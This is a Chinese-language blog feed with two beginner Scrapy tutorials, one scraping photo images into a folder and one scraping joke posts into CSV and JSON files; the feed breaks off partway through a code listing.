<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Form&#39;s Blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-01-21T10:01:21.545Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Mikey</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>第三个项目 美女图片</title>
    <link href="http://example.com/2022/01/20/%E7%AC%AC%E4%B8%89%E4%B8%AA%E9%A1%B9%E7%9B%AE-%E7%BE%8E%E5%A5%B3%E5%9B%BE%E7%89%87/"/>
    <id>http://example.com/2022/01/20/%E7%AC%AC%E4%B8%89%E4%B8%AA%E9%A1%B9%E7%9B%AE-%E7%BE%8E%E5%A5%B3%E5%9B%BE%E7%89%87/</id>
    <published>2022-01-20T09:54:33.000Z</published>
    <updated>2022-01-21T10:01:21.545Z</updated>
    
    <content type="html"><![CDATA[<h2 id="爬取目标"><a href="#爬取目标" class="headerlink" title="爬取目标"></a>爬取目标</h2><p>目标：美女图片<br>网站：<a href="http://www.tupianzj.com/">www.tupianzj.com</a><br>爬取页面：<a href="https://www.tupianzj.com/meinv/mm/">https://www.tupianzj.com/meinv/mm/</a><br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/202201201920748.png"></p><h2 id="初始化项目"><a href="#初始化项目" class="headerlink" title="初始化项目"></a>初始化项目</h2><h3 id="新建项目"><a href="#新建项目" class="headerlink" title="新建项目"></a>新建项目</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">scrapy startproject meinvScrapyPro</span><br><span class="line"><span class="built_in">cd</span> meinvScrapyPro</span><br><span class="line">scrapy genspider meinv www.tupianzj.com</span><br></pre></td></tr></table></figure><h3 id="初始化参数"><a href="#初始化参数" class="headerlink" title="初始化参数"></a>初始化参数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># meinv.py</span></span><br><span class="line">start_urls = [<span class="string">&#x27;https://www.tupianzj.com/meinv/mm/&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># setting.py</span></span><br><span class="line">ROBOTSTXT_OBEY = <span class="literal">False</span></span><br><span class="line">USER_AGENT = <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="设置保存图片的参数"><a href="#设置保存图片的参数" class="headerlink" title="设置保存图片的参数"></a>设置保存图片的参数</h2><h3 id="定义数据类型"><a href="#定义数据类型" class="headerlink" title="定义数据类型"></a>定义数据类型</h3><p>items.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#标题  </span></span><br><span class="line">title = scrapy.Field()  </span><br><span class="line"><span class="comment"># 图片默认存储图片字段 image_urlsimage_urls = scrapy.Field()  </span></span><br><span class="line"><span class="comment"># 下载后存储图片信息字段 imagesimages = scrapy.Field()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="设置保存图片的地址"><a href="#设置保存图片的地址" class="headerlink" title="设置保存图片的地址"></a>设置保存图片的地址</h3><p>setting.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 保存图片的地址  </span></span><br><span class="line">IMAGES_STORE = <span class="string">&#x27;./images&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="设置爬取规则"><a href="#设置爬取规则" class="headerlink" title="设置爬取规则"></a>设置爬取规则</h2><p>meinv.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">div_list = response.xpath(<span class="string">&#x27;//*[@id=&quot;container&quot;]/div/div/div[3]/div/ul/div/li&#x27;</span>)  </span><br><span class="line"><span class="built_in">print</span>(div_list)  </span><br><span class="line"><span class="comment"># 循环每一个模块的div  </span></span><br><span class="line"><span class="keyword">for</span> div <span class="keyword">in</span> div_list:  </span><br><span class="line">    <span class="comment"># 实例化 item item = MeinvscrapyproItem()  </span></span><br><span class="line">    <span class="comment"># 图片src  </span></span><br><span class="line"> src = div.xpath(<span class="string">&#x27;./a/img/@src&#x27;</span>).get()  </span><br><span class="line">    <span class="comment"># 图片标题  </span></span><br><span class="line"> title = div.xpath(<span class="string">&#x27;./a/img/@alt&#x27;</span>).get()  </span><br><span class="line">    <span class="comment"># item内容填充值 图片值必须是列表或元素  </span></span><br><span class="line"> item[<span class="string">&#x27;image_urls&#x27;</span>] = [src]  </span><br><span class="line">    item[<span class="string">&#x27;title&#x27;</span>] = title  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">yield</span> item</span><br></pre></td></tr></table></figure><h2 id="开启项目管道"><a href="#开启项目管道" class="headerlink" title="开启项目管道"></a>开启项目管道</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ITEM_PIPELINES = &#123;  </span><br><span class="line">    <span class="comment"># 需要使用Scrapy 图片处理管道 优先度需要高于数据处理管道  </span></span><br><span class="line"> <span class="string">&#x27;scrapy.pipelines.images.ImagesPipeline&#x27;</span>: <span class="number">200</span>,  </span><br><span class="line"> <span class="string">&#x27;meinvScrapyPro.pipelines.MeinvscrapyproPipeline&#x27;</span>: <span class="number">300</span>,  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运行项目"><a href="#运行项目" class="headerlink" title="运行项目"></a>运行项目</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy crawl meinv</span><br></pre></td></tr></table></figure><p>成功爬取<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/202201211516483.png"></p><p><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/202201202152055.png"></p><blockquote><p>PS: scrapy 的图片下载依赖pillow库，如果没有需要自行下载。</p></blockquote><p>pip install -i <a href="https://pypi.doubanio.com/simple/">https://pypi.doubanio.com/simple/</a> –trusted-host pypi.doubanio.com pillow</p><p>启动爬虫后，可以看到images属性我们虽然没有在程序中放入数据，但是开启后他会自动存入图片的数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">images:&#123;</span><br><span class="line"> [<span class="string">&#x27;checksum&#x27;</span>:<span class="string">&#x27;图片的hash值 用于检测图片是否已存在&#x27;</span>],</span><br><span class="line"> [<span class="string">&#x27;path&#x27;</span>:<span class="string">&#x27;图片存储地址&#x27;</span>],</span><br><span class="line"> [<span class="string">&#x27;status&#x27;</span>:<span class="string">&#x27;状态，下载或更新&#x27;</span>],</span><br><span class="line"> [<span class="string">&#x27;url&#x27;</span>:<span class="string">&#x27;下载图片的url&#x27;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="进阶-图片名字自定义"><a href="#进阶-图片名字自定义" class="headerlink" title="进阶 图片名字自定义"></a>进阶 图片名字自定义</h2><p>重新编写地址提交和图片命名的方法<br>pipelines.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scrapy.pipelines.images <span class="keyword">import</span> ImagesPipeline  </span><br><span class="line"><span class="keyword">from</span> scrapy <span class="keyword">import</span> Request  </span><br><span class="line"><span class="comment"># 继承 ImagesPipeline ，重写其中方法  </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyImagePipeline</span>(<span class="params">ImagesPipeline</span>):</span>  </span><br><span class="line">    <span class="comment"># 重写地址提交方法  </span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">get_media_requests</span>(<span class="params">self, item, info</span>):</span>  </span><br><span class="line">        urls = ItemAdapter(item).get(self.images_urls_field, [])  </span><br><span class="line">        <span class="keyword">return</span> [Request(u, meta=&#123;<span class="string">&#x27;title&#x27;</span>:item[<span class="string">&#x27;title&#x27;</span>]&#125;) <span class="keyword">for</span> u <span class="keyword">in</span> urls]  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 文件重命名  </span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">file_path</span>(<span class="params">self, request, response=<span class="literal">None</span>, info=<span class="literal">None</span>, *, item=<span class="literal">None</span></span>):</span>  </span><br><span class="line">        title = request.meta[<span class="string">&#x27;titl&#x27;</span>]  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;<span class="subst">&#123;title&#125;</span>.jpg&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>开启管道：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;meinvScrapyPro.pipelines.MyImagePipeline&#x27;</span> : <span class="number">200</span>,</span><br></pre></td></tr></table></figure><p>运行项目</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy crawl meinv</span><br></pre></td></tr></table></figure><p>成功爬取<br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/202201211707680.png"><br><img src="https://gitee.com/mikeyning/mikey_-figure-bed/raw/master/202201211708283.png"></p><h2 id="图片处理小结"><a href="#图片处理小结" class="headerlink" title="图片处理小结"></a>图片处理小结</h2><p>图片处理</p><blockquote><ol><li>item 中设置两个字段： image_urls()和images(下载后的图片信息)  </li><li>在setting中设置IMAGES_STORE=’./images’(图片保存路径)  </li><li>iamge_urls值的类型必须是可迭代对象  </li><li>需要开启scrapy图片处理管道：scrapy.pipelines.images.ImagesPipeline  </li></ol></blockquote><p>Tips</p><blockquote><ol><li>如果需要自己定义图片url的变量名，不想使用 image_urls,需要在setting.py 设置 IMAGES_URLS_FIELD = ‘xxx’ </li><li>如果需要用爬取的信息作为文件名，需要重写其图片管道方法。</li></ol></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;爬取目标&quot;&gt;&lt;a href=&quot;#爬取目标&quot; class=&quot;headerlink&quot; title=&quot;爬取目标&quot;&gt;&lt;/a&gt;爬取目标&lt;/h2&gt;&lt;p&gt;目标：美女图片&lt;br&gt;网站：&lt;a href=&quot;http://www.tupianzj.com/&quot;&gt;www.tupianzj.</summary>
      
    
    
    
    <category term="Scrapy 爬虫框架" scheme="http://example.com/categories/Scrapy-%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6/"/>
    
    
    <category term="Scrapy" scheme="http://example.com/tags/Scrapy/"/>
    
    <category term="Python" scheme="http://example.com/tags/Python/"/>
    
    <category term="图片的爬取" scheme="http://example.com/tags/%E5%9B%BE%E7%89%87%E7%9A%84%E7%88%AC%E5%8F%96/"/>
    
  </entry>
  
  <entry>
    <title>第二个项目 - 笑话段子</title>
    <link href="http://example.com/2022/01/16/%E7%AC%AC%E4%BA%8C%E4%B8%AA%E9%A1%B9%E7%9B%AE-%E7%AC%91%E8%AF%9D%E6%AE%B5%E5%AD%90/"/>
    <id>http://example.com/2022/01/16/%E7%AC%AC%E4%BA%8C%E4%B8%AA%E9%A1%B9%E7%9B%AE-%E7%AC%91%E8%AF%9D%E6%AE%B5%E5%AD%90/</id>
    <published>2022-01-16T09:52:57.000Z</published>
    <updated>2022-01-21T10:01:19.688Z</updated>
    
    <content type="html"><![CDATA[<h2 id="新建项目"><a href="#新建项目" class="headerlink" title="新建项目"></a>新建项目</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">scrapy startproject xiaohuaScrapyPro</span><br><span class="line"><span class="built_in">cd</span> xiaohuaScrapyPro</span><br><span class="line">scrapy genspider xiaohua www.fun48.com</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/01/17/YvbwzfgpyoOmMRU.png"></p><h2 id="settings-py设置"><a href="#settings-py设置" class="headerlink" title="settings.py设置"></a>settings.py设置</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改UserAgent</span></span><br><span class="line">USER_AGENT = <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&#x27;</span></span><br><span class="line"><span class="comment"># 设置不遵循robot协议</span></span><br><span class="line">ROBOTSTXT_OBEY = <span class="literal">False</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="选择爬取目标及Xpath"><a href="#选择爬取目标及Xpath" class="headerlink" title="选择爬取目标及Xpath"></a>选择爬取目标及Xpath</h2><p>目标网页：<br><img src="https://s2.loli.net/2022/01/17/GnJXbHrEAReYckT.png"></p><p>**爬取目标 **<br>段子标题：title<br>段子内容：content</p><p><strong>title 的 Xpath:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//div[@class=<span class="string">&quot;x12 article-block isotope&quot;</span>]/div/div/div[2]/a</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/01/17/bSfwntcodTiuJ8r.png"></p><p><strong>content 的 Xpath：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//div[@class=<span class="string">&quot;x12 article-block isotope&quot;</span>]/div/div/div/p</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/01/17/1ivLGEpd7THqcyb.png"></p><h2 id="编写初步的爬取规则"><a href="#编写初步的爬取规则" class="headerlink" title="编写初步的爬取规则"></a>编写初步的爬取规则</h2><p><strong>xiaohua.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XiaohuaSpider</span>(<span class="params">scrapy.Spider</span>):</span>  </span><br><span class="line">    name = <span class="string">&#x27;xiaohua&#x27;</span>  </span><br><span class="line">    allowed_domains = [<span class="string">&#x27;www.fun48.com&#x27;</span>]  </span><br><span class="line"><span class="comment"># 开始爬取的 url</span></span><br><span class="line">    start_urls = [<span class="string">&#x27;https://www.fun48.com/duanzi/&#x27;</span>]  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span>  </span><br><span class="line"><span class="comment"># 爬取列表</span></span><br><span class="line">        div_list = response.xpath(<span class="string">&#x27;//div[@class=&quot;x12 article-block isotope&quot;]/div/div&#x27;</span>)   </span><br><span class="line">        <span class="keyword">for</span> div <span class="keyword">in</span> div_list:  </span><br><span class="line">            title = div.xpath(<span class="string">&#x27;./div[2]/a/text()&#x27;</span>).get() </span><br><span class="line">            <span class="built_in">print</span>(title)  </span><br><span class="line">            content = div.xpath(<span class="string">&#x27;./div/p/text()&#x27;</span>).get()  </span><br><span class="line">            <span class="built_in">print</span>(content)</span><br></pre></td></tr></table></figure><p>运行调试：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy crawl xiaohua</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/01/17/cH58IYFuKZEpk4t.png"></p><h2 id="使用-items-模块，定义数据结构"><a href="#使用-items-模块，定义数据结构" class="headerlink" title="使用 items 模块，定义数据结构"></a>使用 items 模块，定义数据结构</h2><p> <strong>items.py 模块</strong><br>这个模块的作用是保存我们提取的内容<br><img src="https://s2.loli.net/2022/01/17/FMYiO2fIbw3cr6P.png"></p><p>定义保存的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 初始化标题  </span><br><span class="line">title = scrapy.Field()  </span><br><span class="line"># 初始化内容  </span><br><span class="line">content = scrapy.Field()</span><br></pre></td></tr></table></figure><p><strong>xiaohua.py 模块引入 items</strong></p><p>引入items</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 引入数据结构 item</span></span><br><span class="line"><span class="comment"># XiaohuascrapyproItem 是 items 中的类名</span></span><br><span class="line"><span class="keyword">from</span> xiaohuaScrapyPro.items <span class="keyword">import</span> XiaohuascrapyproItem</span><br></pre></td></tr></table></figure><p>使用 items </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 实例化item  </span></span><br><span class="line">item = XiaohuascrapyproItem()  </span><br><span class="line"></span><br><span class="line"><span class="comment"># item 结构数据存储  </span></span><br><span class="line">item[<span class="string">&#x27;title&#x27;</span>] = title  </span><br><span class="line">item[<span class="string">&#x27;content&#x27;</span>]= (<span class="string">&#x27; &#x27;</span>.join(content ))  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">yield</span> item</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>yied 不理解的可以看看:<br><a href="https://blog.csdn.net/mieleizhi0522/article/details/82142856">python中yield的用法详解</a></p><h2 id="调用管道文件-pipelines-py"><a href="#调用管道文件-pipelines-py" class="headerlink" title="调用管道文件(pipelines.py)"></a>调用管道文件(pipelines.py)</h2><p>添加print()，检测是否调用了管道文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_item</span>(<span class="params">self, item, spider</span>):</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;数据持久化操作=============&#x27;</span>)  </span><br><span class="line">    <span class="keyword">return</span> item</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/01/17/MoDVQ6PnSqtr4Ri.png"></p><p><strong>settings.py 文件开启 管道</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Configure item pipelines  </span></span><br><span class="line"><span class="comment"># See https://docs.scrapy.org/en/latest/topics/item-pipeline.html  </span></span><br><span class="line">ITEM_PIPELINES = &#123;  </span><br><span class="line">    <span class="string">&#x27;xiaohuaScrapyPro.pipelines.XiaohuascrapyproPipeline&#x27;</span>: <span class="number">300</span>,  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>前面是开启的管道类名，后面的数字是优先级。</li></ul><p>运行验证：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy crawl xiaohua</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/01/17/TDIAgpxZz7FrqXV.png"><br>可以看到其中输出的 <code>持久化操作</code> ，说明成功调用了管道文件。</p><h2 id="管道文件设置爬虫数据的处理方法"><a href="#管道文件设置爬虫数据的处理方法" class="headerlink" title="管道文件设置爬虫数据的处理方法"></a>管道文件设置爬虫数据的处理方法</h2><p>将文件保存到csv文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> csv  </span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XiaohuascrapyproPipeline</span>:</span>  </span><br><span class="line"><span class="comment"># 开始爬虫方法  </span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">open_spider</span>(<span class="params">self, spider</span>):</span>  </span><br><span class="line">  <span class="comment"># 生成文件句柄，操作  </span></span><br><span class="line">  self.f = <span class="built_in">open</span>(<span class="string">&#x27;xiaohua.csv&#x27;</span>, <span class="string">&#x27;a+&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>, newline=<span class="string">&#x27;&#x27;</span>)  </span><br><span class="line">  <span class="comment"># 创建csv 写实例  </span></span><br><span class="line">  self.csv_write = csv.DictWriter(self.f,fieldnames=[<span class="string">&#x27;title&#x27;</span>,<span class="string">&#x27;content&#x27;</span>])  </span><br><span class="line">  <span class="comment"># 写入头部信息  </span></span><br><span class="line">  self.csv_write.writeheader()  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 进行中  </span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">process_item</span>(<span class="params">self, item, spider</span>):</span>  </span><br><span class="line">  <span class="comment"># 将 item 写入 csv </span></span><br><span class="line">  self.csv_write.writerow(<span class="built_in">dict</span>(item))         </span><br><span class="line">  <span class="keyword">return</span> item  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 结束爬虫方法  </span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">close_spider</span>(<span class="params">self, spider</span>):</span>  </span><br><span class="line">  <span class="comment"># 文件关闭  </span></span><br><span class="line">  self.f.close()</span><br></pre></td></tr></table></figure><p>运行爬虫：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy crawl xiaohua</span><br></pre></td></tr></table></figure><p>成功写入csv文件<br><img src="https://s2.loli.net/2022/01/17/x3ZNwOIg9YKRGAy.png"></p><p>创建一个类，将数据保存到 json文件中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XiaohuascrapyproJsonPipeline</span>:</span>  </span><br><span class="line">    <span class="comment"># 开始爬虫方法  </span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">open_spider</span>(<span class="params">self, spider</span>):</span>  </span><br><span class="line">        <span class="comment"># 生成文件句柄，操作  </span></span><br><span class="line"> self.f = <span class="built_in">open</span>(<span class="string">&#x27;xiaohua.json&#x27;</span>, <span class="string">&#x27;a+&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>, newline=<span class="string">&#x27;&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 进行中  </span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">process_item</span>(<span class="params">self, item, spider</span>):</span>  </span><br><span class="line">        <span class="comment"># 将 item 写入 csv self.f.write(json.dumps(dict(item),ensure_ascii=False)+&quot;,&quot;)  </span></span><br><span class="line">        <span class="keyword">return</span> item  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 结束爬虫方法  </span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">close_spider</span>(<span class="params">self, spider</span>):</span>  </span><br><span class="line">        <span class="comment"># 文件关闭  </span></span><br><span class="line"> self.f.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>setting.py 加入json类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ITEM_PIPELINES = &#123;  </span><br><span class="line">    <span class="string">&#x27;xiaohuaScrapyPro.pipelines.XiaohuascrapyproPipeline&#x27;</span>: <span class="number">300</span>,  </span><br><span class="line"> <span class="string">&#x27;xiaohuaScrapyPro.pipelines.XiaohuascrapyproJsonPipeline&#x27;</span>: <span class="number">200</span>,  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行验证：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy crawl xiaohua</span><br></pre></td></tr></table></figure><p>成功写入json文件<br><img src="https://s2.loli.net/2022/01/17/b2HscijDvSloOpt.png"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>简单的编写了一个爬虫程序，对Scrapy框架的运行方式和结构有了初步的认识。</p><p>爬虫名.py:<br>爬虫的具体程序，包含了爬取的初始地址，爬取的规则，爬取的流程。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy  </span><br><span class="line"><span class="comment"># 引入数据结构 itemfrom xiaohuaScrapyPro.items import XiaohuascrapyproItem  </span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XiaohuaSpider</span>(<span class="params">scrapy.Spider</span>):</span>  </span><br><span class="line"> name = <span class="string">&#x27;xiaohua&#x27;</span>  </span><br><span class="line"> allowed_domains = [<span class="string">&#x27;www.fun48.com&#x27;</span>]  </span><br><span class="line"> start_urls = [<span class="string">&#x27;https://www.fun48.com/duanzi/&#x27;</span>]  </span><br><span class="line">  </span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span>  </span><br><span class="line">  div_list =        response.xpath(<span class="string">&#x27;//div[@class=&quot;x12 article-block isotope&quot;]/div/div&#x27;</span>)  </span><br><span class="line">   <span class="keyword">for</span> div <span class="keyword">in</span> div_list:  </span><br><span class="line">    title = div.xpath(<span class="string">&#x27;./div[2]/a/text()&#x27;</span>).get() </span><br><span class="line">    content = div.xpath(<span class="string">&#x27;./div/p/text()&#x27;</span>).get()  </span><br><span class="line">    <span class="comment"># 实例化item  </span></span><br><span class="line">    item = XiaohuascrapyproItem()  </span><br><span class="line">    <span class="comment"># item 结构数据存储  </span></span><br><span class="line">    item[<span class="string">&#x27;title&#x27;</span>] = title  </span><br><span class="line">    item[<span class="string">&#x27;content&#x27;</span>]= (<span class="string">&#x27; &#x27;</span>.join(content ))    </span><br><span class="line">    <span class="keyword">yield</span> item</span><br></pre></td></tr></table></figure><p>items.py:<br>定义了抓取的数据结构，比如文章内容等。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Define here the models for your scraped items  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment"># See documentation in:  